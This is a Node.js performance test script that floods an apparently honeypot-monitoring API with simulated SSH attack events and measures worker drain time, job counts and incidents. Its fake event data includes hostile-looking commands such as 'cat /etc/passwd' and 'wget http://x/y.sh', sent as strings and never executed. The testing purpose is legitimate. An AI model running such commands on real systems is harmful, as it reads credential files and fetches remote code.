// G5 burst test: one attacker, a long chain delivered as many small ingest calls (what a busy
// sensor shipping every few hundred ms looks like). Measures how long the worker takes to drain
// it and how many process-events jobs it cost. Run it before and after a worker change.
//
//   node scripts/perf/chain5k.mjs --project <id> [--db postgres://...] [options]
//
// Options (env in brackets):
//   --api       [LXS_API_URL]   default http://localhost:8080
//   --key       [LXS_KEY]       ingest key, default the seeded dev key
//   --project   [LXS_PROJECT]   project id (required; only used to scope the measurements)
//   --db        [DATABASE_URL]  Postgres of that API. Needed for the drain time and job stats
//   --events    default 5000
//   --batch     events per POST, default 50 (so 100 POSTs)
//   --metrics-token [METRICS_TOKEN]  also diff GET /metrics worker counters
//
// The DB is only read: events of the test source and pgboss job rows for the project. Point it
// at a scratch or dev database and a throwaway project, never production.
import { createRequire } from 'node:module';
import { parseArgs } from 'node:util';

const { values: a } = parseArgs({
  options: {
    api: { type: 'string', default: process.env.LXS_API_URL ?? 'http://localhost:8080' },
    key: {
      type: 'string',
      default: process.env.LXS_KEY ?? 'ds_dev_0000000000000000000000000000000000000000',
    },
    project: { type: 'string', default: process.env.LXS_PROJECT },
    db: { type: 'string', default: process.env.DATABASE_URL },
    events: { type: 'string', default: '5000' },
    batch: { type: 'string', default: '50' },
    'metrics-token': { type: 'string', default: process.env.METRICS_TOKEN },
    timeout: { type: 'string', default: '600' },
  },
});
const N = Number(a.events);
const BATCH = Number(a.batch);
if (!a.project) {
  console.error('usage: node scripts/perf/chain5k.mjs --project <id> [--db <url>]');
  process.exit(2);
}

// postgres.js lives in apps/api; resolve it from there so this script needs no install.
const require = createRequire(new URL('../../apps/api/package.json', import.meta.url));
const sql = a.db ? require('postgres')(a.db, { max: 2, onnotice: () => {} }) : null;

const A = '0123456789ABCDEFGHJKMNPQRSTVWXYZ';
const ulid = () => Array.from({ length: 26 }, () => A[(Math.random() * 32) | 0]).join('');
const ip = `198.18.${(Math.random() * 250) | 0}.${1 + ((Math.random() * 250) | 0)}`;
const base = {
  schema_version: 1,
  sensor: 'ssh',
  decoy_id: 'ssh-db-backup-01',
  is_decoy: true,
  src_ip: ip,
  src_port: 50000,
  dst_service: 'ssh:22',
  count: 1,
  simulated: true,
};
// A credential-stuffing source that occasionally gets in and runs commands: every batch
// qualifies on its own (R04), so the old worker opened one incident per POST.
const CMDS = ['uname -a', 'id', 'cat /etc/passwd', 'ls -la /srv', 'wget http://x/y.sh'];
let t = Date.now() - N * 50;
function make(i) {
  t += 50;
  const session = `chain5k:${ip}:${Math.floor(i / 100)}`;
  const common = { ...base, id: ulid(), timestamp: new Date(t).toISOString(), session_id: session };
  if (i % 25 === 24)
    return {
      ...common,
      event_type: 'command.exec',
      command: CMDS[i % CMDS.length],
      outcome: 'success',
    };
  return {
    ...common,
    event_type: 'auth.attempt',
    outcome: 'failure',
    username: 'root',
    password_clear: `pw${i}`,
  };
}

async function scrape() {
  if (
    !a['metrics-token'] &&
    !(await fetch(`${a.api}/metrics`).then(
      (r) => r.ok,
      () => false,
    ))
  )
    return null;
  const r = await fetch(`${a.api}/metrics`, {
    headers: a['metrics-token'] ? { authorization: `Bearer ${a['metrics-token']}` } : {},
  });
  if (!r.ok) return null;
  const text = await r.text();
  const pick = (re) => Number(re.exec(text)?.[1] ?? 0);
  return {
    jobs: pick(
      /lxs_worker_job_duration_seconds_count\{queue="process-events",outcome="ok"\} (\S+)/,
    ),
    seconds: pick(
      /lxs_worker_job_duration_seconds_sum\{queue="process-events",outcome="ok"\} (\S+)/,
    ),
  };
}

const m0 = await scrape();
const startedAt = new Date();
const t0 = performance.now();
let posts = 0;
let accepted = 0;
for (let i = 0; i < N; i += BATCH) {
  const events = Array.from({ length: Math.min(BATCH, N - i) }, (_, k) => make(i + k));
  for (;;) {
    const r = await fetch(`${a.api}/v1/ingest`, {
      method: 'POST',
      headers: { 'content-type': 'application/json', authorization: `Bearer ${a.key}` },
      body: JSON.stringify({ events }),
    });
    if (r.status === 429) {
      await new Promise((res) => setTimeout(res, 1000 * Number(r.headers.get('retry-after') ?? 1)));
      continue;
    }
    if (r.status !== 202) throw new Error(`ingest ${r.status}: ${await r.text()}`);
    accepted += (await r.json()).accepted;
    posts++;
    break;
  }
}
const ingestMs = performance.now() - t0;
console.log(
  `source ${ip}: ${accepted} events in ${posts} POSTs, ingest took ${(ingestMs / 1000).toFixed(2)} s`,
);

if (!sql) {
  console.log('no --db: skipping drain time and job stats');
  process.exit(0);
}

const deadline = Date.now() + Number(a.timeout) * 1000;
let drainedMs = null;
while (Date.now() < deadline) {
  const [{ n }] = await sql`
    select count(*)::int as n from events
    where project_id = ${a.project}::uuid and src_ip = ${ip}::inet and processed_at is null`;
  if (n === 0) {
    drainedMs = performance.now() - t0;
    break;
  }
  await new Promise((r) => setTimeout(r, 100));
}
if (drainedMs === null) console.log('TIMEOUT: events still unprocessed');

// Every queued job still runs (as a no-op scan once the events are gone): wait for the queue
// to empty for this project so the job count and busy time are complete. The once-a-minute
// sweep (processEvents({})) may also drain events; it carries no projectId, so it is not
// counted here, which is why the drain time is the headline number.
let settledMs = null;
while (Date.now() < deadline) {
  const [{ n }] = await sql`
    select count(*)::int as n from pgboss.job
    where name = 'process-events' and created_on >= ${startedAt}
      and data->>'projectId' = ${a.project} and state in ('created', 'retry', 'active')`;
  if (n === 0) {
    settledMs = performance.now() - t0;
    break;
  }
  await new Promise((r) => setTimeout(r, 200));
}
console.log(
  `queue settled ${settledMs === null ? 'n/a (timeout)' : `${(settledMs / 1000).toFixed(2)} s`} after the first POST`,
);
const jobRows = await sql`
  select state, started_on, completed_on, data from pgboss.job
  where name = 'process-events' and created_on >= ${startedAt}
    and data->>'projectId' = ${a.project}
  union all
  select state, started_on, completed_on, data from pgboss.archive
  where name = 'process-events' and created_on >= ${startedAt}
    and data->>'projectId' = ${a.project}`.catch(
  async () =>
    sql`
  select state, started_on, completed_on, data from pgboss.job
  where name = 'process-events' and created_on >= ${startedAt}
    and data->>'projectId' = ${a.project}`,
);
const ran = jobRows.filter((j) => j.started_on && j.completed_on);
const workerS = ran.reduce((s, j) => s + (j.completed_on - j.started_on) / 1000, 0);
// Jobs fetched in one batch share started_on and run one after another, so the plain sum
// over-counts; the union of their intervals is the time the worker was actually busy on them.
let busyS = 0;
let edge = 0;
for (const j of [...ran].sort((x, y) => x.started_on - y.started_on)) {
  const s = Math.max(j.started_on.getTime(), edge);
  const e = j.completed_on.getTime();
  if (e > s) busyS += (e - s) / 1000;
  edge = Math.max(edge, e);
}
const [{ incidents }] = await sql`
  select count(distinct incident_id)::int as incidents from events
  where project_id = ${a.project}::uuid and src_ip = ${ip}::inet and incident_id is not null`;

const m1 = await scrape();
console.log(
  [
    `drained ${drainedMs === null ? 'n/a' : `${(drainedMs / 1000).toFixed(2)} s`} after the first POST`,
    `process-events jobs: ${jobRows.length} created, ${ran.length} ran`,
    `worker busy (union of job intervals): ${busyS.toFixed(2)} s; sum of job intervals ${workerS.toFixed(2)} s`,
    `incidents opened for the source: ${incidents}`,
    m0 && m1
      ? `/metrics delta: ${m1.jobs - m0.jobs} jobs, ${(m1.seconds - m0.seconds).toFixed(2)} s`
      : '/metrics: not available',
  ].join('\n'),
);
await sql.end();
